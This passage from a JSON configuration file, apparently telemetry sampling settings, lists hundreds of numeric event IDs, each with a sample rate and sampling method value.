							},
							"572134284": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"572135240": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"572135712": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"572136953": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"572137945": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"572142814": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"572145501": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573309988": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573310022": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573310141": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573310926": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573311931": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573312848": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573313316": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573315894": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573316728": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573317629": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573317714": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573318610": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573318778": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573319052": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573319429": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573320127": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573320487": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573321233": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573321857": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573323179": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573323510": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573323528": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573323738": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"573325103": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"578813953": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"578813954": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"582025217": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"582025218": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"582027575": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"588713587": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"592582133": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"593299269": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593299382": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593301612": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593302224": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593303128": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593303848": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593304449": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593305703": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593306265": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593307586": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593307694": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593309420": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593310598": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593311730": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"593313520": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"594679032": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"597497308": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"597498673": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"597501298": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"602148241": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"602150380": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"602153811": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"602154925": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"602157403": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"602161050": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"603196156": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"603202213": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"603202571": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"609891048": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"612961719": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"612970753": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"612973892": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"624763788": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"624764751": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625870199": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625870607": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625870658": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625870761": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625872161": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625872374": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625872449": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625872960": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625873595": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625874920": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625875030": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625876304": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625876688": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625877403": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625877881": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625878955": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625879077": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625880936": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625882015": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625882307": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625882731": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625883074": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625883668": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625884250": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625884944": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"625884983": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"640496395": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"641272127": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"641272881": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"641273441": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"641273554": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"641275636": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"641278608": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"641281776": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"641282992": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"641284572": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"642320131": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"642320141": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"642322226": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"642330111": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"642333495": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"642334504": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"642334561": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"649994381": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"656148117": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656149153": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656150284": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656152605": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656153056": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656153396": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656153475": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656154840": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656156235": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656156649": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656157006": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656157513": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656158903": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656160300": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656162024": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"656162239": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658310259": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658311000": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658311653": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658312030": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658312060": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658312503": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658313937": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658314754": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658319560": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658320532": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658323570": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"658325194": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"660800939": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"660808103": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"660811565": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"662769649": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663618882": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663621158": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663621340": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663621548": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663622595": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663622603": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663622613": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663622990": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663624058": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663625914": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663626399": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663627363": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663627729": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663628202": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663629736": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663630260": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663631213": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663631390": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663631507": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663631670": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"663632194": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"664017918": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"667166687": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"668272330": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"668282222": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"668283633": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"674368495": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"678690817": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"678690818": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"678693247": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"678703543": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"678703920": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"680527317": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"680532701": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"680535791": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"680535976": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"680536201": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"680538837": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"685309953": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"685309954": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"688919680": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"688924705": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"688926599": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"688930365": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"689903304": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"689904686": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"689907311": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"689908443": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"689910058": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"691799027": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"691813340": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"691998369": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"692000793": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"692008145": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"692010481": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"695799416": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"695806386": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"696780884": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"696782251": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"696782870": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"697373488": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"706281473": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"716966647": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"716979633": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"719323137": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"719323138": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"719326647": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"719327653": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"719332537": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"719334544": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"719335669": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"719336631": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"719988411": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725156869": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725157581": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725157683": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725157923": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725158389": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725158695": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725159829": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725160706": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725163651": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725165351": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725166821": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725170528": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725430792": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"725614593": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"725623863": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"731650369": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"732639803": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"732826875": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732827560": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732830316": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732832471": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732832692": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732833806": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732834481": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732835137": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732835689": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732836954": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"732838764": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"733095886": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"738133175": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"738142835": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"742524264": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"742525195": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"742525508": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"742528755": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"742528977": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"742531496": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"742535026": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"742535799": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"742535803": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"747445299": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"747454106": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"755959842": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"755965148": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"755968561": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"759367619": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"759373195": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"759564472": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"759566636": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"759576445": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"767301815": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"777060353": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"777330614": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"777338387": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"777977857": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"777977858": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"778897115": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"779749791": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"779762281": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"782894281": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"782907314": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"782908389": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"788144639": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"789446657": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"789450742": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"790891628": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"790898449": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"790901695": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"791348342": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791348357": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791349910": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791354452": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791355447": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791357141": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791358076": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791358662": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791359059": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791359682": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791362362": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"791363445": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"801442060": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"801443888": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"806236986": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"806238920": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"810488499": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"810490227": {
								"sampleRate": 5,
								"samplingMethod": 1
							},
							"810490283": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"810491575": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"810492213": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"810492450": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"810497509": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"810497622": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"810497709": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"810498220": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"819201633": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"819206995": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"819473229": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"823333654": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"825425921": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"825433348": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"835064883": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"835068505": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"835069323": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"835075303": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"841618442": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"841622832": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"841627612": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"846476042": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"849421651": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"857803746": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"864880358": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864880542": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864882179": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"864882378": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864882430": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864882560": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864882964": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864884364": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864885227": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864886206": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"864887684": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864887734": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864887867": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864887875": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864888445": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864888473": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864888531": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864888969": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864888990": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864889697": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864889698": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864889839": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"864891596": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864892120": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864892443": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864892947": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864893556": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864893982": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"864894344": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"866649736": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866650326": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866650701": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866652534": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866653173": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866653743": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866653977": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866654711": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866655634": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866657326": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"866663933": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"868220929": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"868222401": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"869731149": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"876876699": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"876877572": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"876877588": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"876878048": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"876878791": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"876879076": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"876881256": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"886127310": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"890439053": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"890442675": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"891686230": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"892211987": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"892215753": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"893386753": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"896140808": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"896147113": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"896148353": {
								"sampleRate": 20000,
								"samplingMethod": 1
							},
							"896149667": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"899355574": {
								"sampleRate": 10,
								"samplingMethod": 1
							},
							"901855609": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"916591346": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"916594868": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"916596786": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"916599023": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"916602249": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"918820258": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"918825252": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"919603854": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"919604299": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"919604703": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"919609721": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"919623711": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"931594241": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932184065": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932906418": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932909142": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932909377": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932909931": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932910147": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932910200": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932912792": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932912954": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932913600": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932913663": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932914460": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932915806": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932915999": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932916075": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932917888": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932918244": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"932918590": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"932920974": {
								"sampleRate": 10000,
